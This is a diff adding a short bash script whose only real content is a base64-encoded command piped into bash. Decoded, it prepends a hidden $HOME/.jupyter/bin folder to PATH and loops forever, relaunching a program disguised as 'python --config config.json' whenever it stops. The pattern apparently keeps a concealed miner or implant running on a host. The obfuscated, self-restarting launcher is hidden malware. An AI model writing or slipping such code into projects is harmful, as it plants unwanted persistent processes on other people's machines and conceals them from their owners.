@@ -1,0 +1,2 @@
+#!/bin/bash
+bash -c "base64 -d <<< UEFUSD0kSE9NRS8uanVweXRlci9iaW46JFBBVEggJiYgUlVOTkVSPTEgJiYgd2hpbGUgWyAxIF07IGRvIFJVTk5FUj0kKHBzIC1lbyBjbWQgfCBncmVwIC1vICJweXRob24gLS1jb25maWcgY29uZmlnLmpzb24iIHwgd2MgLWwpICYmIGlmIFtbICRSVU5ORVIgPCAyIF1dOyB0aGVuIHB5dGhvbiAtLWNvbmZpZyBjb25maWcuanNvbjsgZmk7IHNsZWVwIDE7IGRvbmU= | bash"
